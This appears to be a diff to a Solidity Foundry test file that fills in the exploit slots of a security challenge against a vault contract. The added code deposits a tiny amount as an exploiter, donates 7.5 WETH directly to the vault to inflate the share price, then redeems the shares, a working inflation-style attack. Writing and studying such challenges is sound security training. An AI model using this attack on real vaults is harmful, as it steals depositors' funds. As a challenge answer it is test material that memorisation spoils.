@@ -47,13 +47,18 @@ contract TestSolution is Test {
 
     }
 
-    function testAnswer() public {
+    function testSolution() public {
         /*
         *
         *
         *  === Your Exploit Code Here ===
         * 
         */
+        vm.startPrank(exploiter);
+        weth.approve(address(vault), type(uint256).max);
+        vault.deposit(1, address(weth), exploiter);
+        weth.transfer(address(vault), 7.5 ether);
+        vm.stopPrank();
 
 
 
@@ -76,7 +81,10 @@ contract TestSolution is Test {
         *  === More Exploit Code Here If Required ===
         * 
         */
-
+        vm.startPrank(address(exploiter));
+        vault.setApprovalForAll(address(vault), true);
+        vault.redeem(vault.balanceOf(exploiter, 1), 1, exploiter, exploiter);
+        vm.stopPrank();
 
 
         // === Do Not Change - Exit Conditions ===
